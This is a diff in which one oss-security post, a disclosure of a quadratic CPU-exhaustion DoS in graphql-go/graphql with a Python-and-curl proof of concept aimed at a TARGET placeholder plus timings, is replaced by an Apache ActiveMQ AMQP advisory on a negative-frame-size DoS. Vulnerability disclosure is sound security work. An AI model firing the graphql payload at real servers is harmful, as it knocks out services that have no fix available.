@@ -1,89 +1,38 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/29/3
-Message-ID: <CAK=gNzrqaNWsqHoLPXMB4Pvkzz+gHiTae7gHMzX=NzGfPEo6nw@mail.gmail.com>
-Date: Sat, 29 Aug 2026 17:59:54 +0200
-From: William Carrier <0x6675636b736f6369617479@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/07/27/7
+Message-ID: <2bfaa7a5-7d7d-2a43-7a63-252d74db5b03@apache.org>
+Date: Mon, 27 Jul 2026 17:17:52 +0000
+From: "Christopher L. Shannon" <cshannon@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: graphql-go/graphql <= 0.8.1: quadratic CPU-exhaustion DoS from a single syntax error
+Subject: CVE-2026-59878: Apache ActiveMQ AMQP, Apache ActiveMQ, Apache ActiveMQ All: AMQP NIO negative frame size validation bypass leading to DoS 
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+Severity: moderate 
 
-This reports an algorithmic-complexity denial-of-service defect in
-github.com/graphql-go/graphql, affecting all released versions up to and
-including the latest, v0.8.1. No fixed version exists. It is
-unauthenticated, network-reachable, triggered purely by attacker-controlled
-query text, and requires no special configuration, a single syntax error,
-no schema dependency. Reproduced against the published v0.8.1 module
-fetched from the Go module proxy.
+Affected versions:
 
-A CVE ID has been requested from MITRE and is pending.
+- Apache ActiveMQ AMQP (org.apache.activemq:activemq-amqp) before 5.19.9
+- Apache ActiveMQ AMQP (org.apache.activemq:activemq-amqp) 6.0.0 before 6.2.8
+- Apache ActiveMQ (org.apache.activemq:apache-activemq) before 5.19.9
+- Apache ActiveMQ (org.apache.activemq:apache-activemq) 6.0.0 before 6.2.8
+- Apache ActiveMQ All (org.apache.activemq:activemq-all) before 5.19.9
+- Apache ActiveMQ All (org.apache.activemq:activemq-all) 6.0.0 before 6.2.8
 
-== Affected ==
+Description:
 
-  Product:  github.com/graphql-go/graphql
-  Versions: all <= v0.8.1; no fix available
-  CWE:      CWE-407 (Inefficient Algorithmic Complexity) / CWE-1050
-  CVSS:     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  = 7.5 (High)
+Improper Input Validation vulnerability in Apache ActiveMQ AMQP, Apache ActiveMQ, Apache ActiveMQ All.
 
-== Details ==
+A remote unauthenticated peer that can reach an exposed AMQP NIO connector can trigger denial-of-service behavior by sending a frame size value. This cause the NIO threads to die and if done rapidly enough can lead to exhaustion of the NIO thread pool denying service to other connections.
+This issue affects Apache ActiveMQ AMQP: before 5.19.9, from 6.0.0 before 6.2.8; Apache ActiveMQ: before 5.19.9, from 6.0.0 before 6.2.8; Apache ActiveMQ All: before 5.19.9, from 6.0.0 before 6.2.8.
 
-When the parser reports a syntax error, gqlerrors.highlightSourceAtLocation
-(gqlerrors/syntax.go) renders the "^" caret line by appending one space per
-column in a loop:
+Users are recommended to upgrade to version 5.19.9, 6.2.8, or 6.3.0 which fixes the issue.
 
-    var highlight string
-    ...
-    for i := 1; i < (2 + padLen + l.Column); i++ {
-        highlight += " "                     // Go string += reallocates +
-copies all
-    }
-    highlight += "^\n"
+Credit:
 
-Go string concatenation copies the entire accumulated string on every
-iteration, so drawing the caret at column C is O(C^2). The column is
-attacker-controlled: one unterminated string literal C bytes long yields
-exactly one syntax error at column ~C. A single request is therefore
-O(request_size^2) with just ONE syntax error and no schema involvement.
+zx (Jace) (finder)
 
-== Proof of concept ==
+References:
 
-One POST whose query is an unterminated string literal of C characters:
-
-    # query text:  { f(x: "AAAA...AAAA<newline>) }   with C 'A's before the
-newline
-    python3 - "$C" <<'PY' > body.json
-    import sys, json
-    c = int(sys.argv[1])
-    q = '{ f(x: "' + 'a'*c + '\n) }'
-    sys.stdout.write(json.dumps({"query": q}))
-    PY
-    curl -s -o /dev/null -w '%{time_total}\n' -X POST http://TARGET/graphql
-\
-         -H 'Content-Type: application/json' --data-binary @body.json
-
-Measured over HTTP against v0.8.1 (clean quadratic, 2x column ~ 4x time):
-
-    column=50000   (50 KB)   -> 2.1 s
-    column=100000  (100 KB)  -> 9.2 s
-    column=200000  (200 KB)  -> 54.0 s
-
-== Impact ==
-
-A single unauthenticated ~200 KB request with one syntax error consumes ~54
-s of server CPU; a small number of concurrent such requests saturates the
-worker pool and denies service. Lowest-effort trigger imaginable: one
-malformed literal, any schema, no authentication, no configuration.
-
-== Remediation ==
-
-No fixed release exists. Build the caret padding in one allocation,
-strings.Repeat(" ", n), a strings.Builder, or a bytes.Buffer -- instead of
-the O(n^2) `highlight += " "` loop.
-
-== Credit ==
-
-  William Carrier, independent security researcher.
-
-Best,
+https://activemq.apache.org/
+https://www.cve.org/CVERecord?id=CVE-2026-59878
 
